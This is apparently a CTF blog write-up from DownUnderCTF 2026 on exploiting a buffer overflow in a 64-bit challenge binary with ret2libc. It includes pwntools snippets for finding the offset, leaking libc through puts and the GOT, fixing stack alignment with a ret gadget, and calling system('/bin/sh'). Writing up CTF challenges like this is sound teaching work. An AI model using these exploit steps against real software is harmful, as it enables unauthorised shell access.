---
title: ret2libc, but the stars aligned
tag: pwn
date: 2026-06-14
ctf: DownUnderCTF 2026
read: 6 min
---

A classic **buffer overflow** that looked routine until the offsets refused to cooperate. This is the story of leaking libc, finding gadgets, and the one byte that cost me two hours.

## Recon

The binary was a 64-bit ELF, no PIE, partial RELRO, and — critically — NX enabled. That rules out shellcode on the stack, so `ret2libc` it is.

```bash
$ checksec ./chall
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

No stack canary is the gift here: we can smash the return address directly.

## Finding the offset

I used a cyclic pattern to locate the saved return address:

```python
from pwn import *
p = process('./chall')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
log.info(f"offset = {offset}")   # 72
```

> The offset came out to **72** — 64 bytes of buffer plus the saved RBP.

## Leaking libc

With no PIE on the binary but ASLR on libc, the plan is:

1. Leak a known libc address using `puts@plt` on a GOT entry
2. Compute the libc base from the leak
3. Return back into `main` for a second-stage payload

```python
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
payload = b'A' * 72 + rop.chain()
```

Once `puts` leaked the real address, subtracting the known offset gave the libc base. From there, `system` and `/bin/sh` are trivial.

## The two-hour byte

Everything *should* have worked — but the second stage kept crashing. The culprit: a **stack alignment** issue. `system` needs a 16-byte aligned stack on modern glibc, and my chain was off by 8. One extra `ret` gadget fixed it:

```python
rop.raw(rop.find_gadget(['ret'])[0])   # align the stack
rop.system(next(libc.search(b'/bin/sh')))
```

## Takeaways

- Always check stack alignment before blaming your offsets.
- A `ret` sled is the cheapest fix in the book.
- `pwntools` `corefile` support turns offset-hunting into a one-liner.

Flag captured, sleep deprived, worth it.
